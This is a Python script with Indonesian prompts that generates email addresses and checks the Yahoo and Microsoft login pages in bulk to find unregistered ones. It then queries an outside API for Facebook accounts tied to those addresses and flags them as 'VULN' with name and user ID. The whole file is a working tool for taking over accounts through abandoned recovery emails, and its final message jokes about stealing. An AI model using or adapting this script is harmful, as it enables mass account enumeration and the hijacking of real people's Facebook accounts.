# coding: utf-8
# Created By DulLah

from multiprocessing.pool import ThreadPool
import requests, re, sys

loop=0
die=0
file=open('email_mati.txt','w')

def hotmail(email):
  try:
    global die, loop, jumlah, file
    loop+=1
    response=requests.get('https://login.live.com/?username='+email)
    cek=re.findall('"IfExistsResult":(.*?)},', response.text)[0]
    if (cek == "1"):
      file.write(str(email)+'\n')
      die+=1
    sys.stdout.write('\r({0}\{1}) Email mati:-{2}   '.format(loop, jumlah, die))
  except: pass

def yahoo(email):
  try:
    global die, loop, jumlah, file
    loop+=1
    s=requests.session()
    response=s.get('https://login.yahoo.com/config/login')
    cookies=s.cookies.get_dict()
    acrumb=re.findall('name="acrumb" value="(.*)"', response.text)[0]
    sessionIndex=re.findall('name="sessionIndex" value="(.*?)"', response.text)[0]
    params={'username':email, 'acrumb':acrumb, 'sessionIndex':sessionIndex}
    headers={'X-Requested-With':'XMLHttpRequest'}
    response=s.post('https://login.yahoo.com/config/login', data=params, cookies=cookies, headers=headers).text
    if not '/account/challenge/recaptcha' in str(response):
      file.write(str(email)+'\n')
      die+=1
    sys.stdout.write('\r({0}\{1}) Email mati:-{2}   '.format(loop, jumlah, die))
  except:pass

def fbvalidate(email):
  try:
    headers={
      'User-Agent':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
      'X-Requested-With':'XMLHttpRequest',
      'Accept':'application/json, text/javascript, */*; q=0.01',
      'Referer':'https://nabil.my.id/Fb_Checker_UID_Email',
      'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    }
    response=requests.post('https://nabil.my.id/api/fbcheckinfoemail', data={'email':email}, headers=headers).json()
    nama=response['nama']
    uid=response['uid']
    if nama !='Tidak Ada':
      print('VULN => '+str(nama)+'|'+str(uid)+'|'+str(email)+'')
  except: pass

params={}
print('''
T Y P E   E M A I L

 1. Yahoo
 2. Hotmail
''')
pil=raw_input('>> ')
if pil=='1':
  params['domain']='yahoo.com'
elif pil=='2':
  params['domain']='hotmail.com'
else:
  exit('Pilihan tidak ada!')

print('''
K A R A K T E R

 1. (-) Strip
 2. (_) Garis bawah
 3. (none) Tanpa karakter
 4. (-, _) Acak
''')
pil=raw_input('>> ')
if pil=='1':
  params['karakter']='-'
elif pil=='2':
  params['karakter']='_'
elif pil=='3':
  params['karakter']='none'
elif pil=='4':
  params['karakter']='acak'
else:
  exit('Pilihan tidak ada!')

print('''
V E R S I

 1. Email generator versi 1
 2. Email generator versi 2
''')
pil=raw_input('>> ')
if pil == '1':
  nama=raw_input('\nNama pengguna: ')
  jumlah=raw_input('Jumlah: ')
  params['nama']=nama
  params['n_awal']='1'
  params['n_akhir']=jumlah
  url='https://dz-tools.my.id/api/email-generator/v1'
elif pil=='2':
  jumlah=raw_input('\nJumlah: ')
  params['jumlah']=jumlah
  url='https://dz-tools.my.id/api/email-generator/v2'
else:
  exit('Pilihan tidak ada!')

print('')
response=requests.post(url, data=params).json()
total=0
email=[]
try:
  for x in response['data']:
    total+=1
    print(str(total)+'. '+str(x['email']))
    email.append(str(x['email']))
except: exit('Error')
print('')
if params['domain']=='yahoo.com':
  ThreadPool(30).map(yahoo, email)
  file.close()
elif params['domain']=='hotmail.com':
  ThreadPool(30).map(hotmail, email)
  file.close()
fb=[]
for i in open('email_mati.txt','r').readlines():
  fb.append(i.strip())
if len(fb) == 0:
  exit('\n\nTidak ada email mati.')
print('\n\nMulai memvalidasi email facebook...\n')
ThreadPool(10).map(fbvalidate, fb)
exit('\nSelesai, jgan maling terus ya om tobat!!')